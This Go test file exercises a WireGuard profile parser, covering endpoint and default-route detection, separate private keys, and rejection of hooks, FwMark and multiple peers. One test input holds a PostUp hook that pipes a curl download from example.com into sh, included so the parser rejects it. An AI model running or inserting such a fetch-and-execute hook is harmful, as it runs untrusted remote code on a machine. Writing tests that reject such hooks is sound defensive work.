package externalegress

import "testing"

func TestParseWireGuardClientProfile(t *testing.T) {
	raw := `[Interface]
PrivateKey = private
Address = 10.10.0.2/32

[Peer]
PublicKey = public
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
`
	preview, err := ParseWireGuard([]byte(raw))
	if err != nil {
		t.Fatalf("ParseWireGuard returned error: %v", err)
	}
	if preview.EndpointHost != "vpn.example.com" || preview.EndpointPort != 51820 || !preview.HasPrivateKey || !preview.HasDefaultRoute {
		t.Fatalf("unexpected preview: %#v", preview)
	}
}

func TestParseWireGuardReportsMissingIPv4DefaultRoute(t *testing.T) {
	raw := `[Interface]
PrivateKey = private
Address = 10.10.0.2/32

[Peer]
PublicKey = public
Endpoint = vpn.example.com:51820
AllowedIPs = 10.20.0.0/16
`
	preview, err := ParseWireGuard([]byte(raw))
	if err != nil {
		t.Fatalf("ParseWireGuard returned error: %v", err)
	}
	if preview.HasDefaultRoute {
		t.Fatalf("unexpected IPv4 default route in preview: %#v", preview)
	}
}

func TestParseWireGuardRejectsHooks(t *testing.T) {
	raw := `[Interface]
PrivateKey = private
PostUp = curl https://example.com/script | sh
[Peer]
PublicKey = public
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
`
	if _, err := ParseWireGuard([]byte(raw)); err == nil {
		t.Fatal("expected WireGuard hook to be rejected")
	}
}

func TestParseWireGuardRejectsProviderFWMark(t *testing.T) {
	raw := `[Interface]
PrivateKey = private
FwMark = 0x4d590001
[Peer]
PublicKey = public
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
`
	if _, err := ParseWireGuard([]byte(raw)); err == nil {
		t.Fatal("expected provider WireGuard FwMark to be rejected")
	}
}

func TestParseWireGuardAcceptsSeparatePrivateKey(t *testing.T) {
	raw := `[Interface]
Address = 10.10.0.2/32
[Peer]
PublicKey = public
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
`
	preview, err := ParseWireGuard([]byte(raw))
	if err != nil {
		t.Fatalf("ParseWireGuard returned error: %v", err)
	}
	if len(preview.RequiredSecrets) != 1 || preview.RequiredSecrets[0] != "private_key" {
		t.Fatalf("required secrets = %#v, want private_key", preview.RequiredSecrets)
	}
}

func TestParseWireGuardRejectsMultiplePeers(t *testing.T) {
	raw := `[Interface]
PrivateKey = private
Address = 10.10.0.2/32
[Peer]
PublicKey = first
Endpoint = first.example.com:51820
AllowedIPs = 0.0.0.0/1
[Peer]
PublicKey = second
Endpoint = second.example.com:51820
AllowedIPs = 128.0.0.0/1
`
	if _, err := ParseWireGuard([]byte(raw)); err == nil {
		t.Fatal("expected multiple WireGuard peers to be rejected")
	}
}
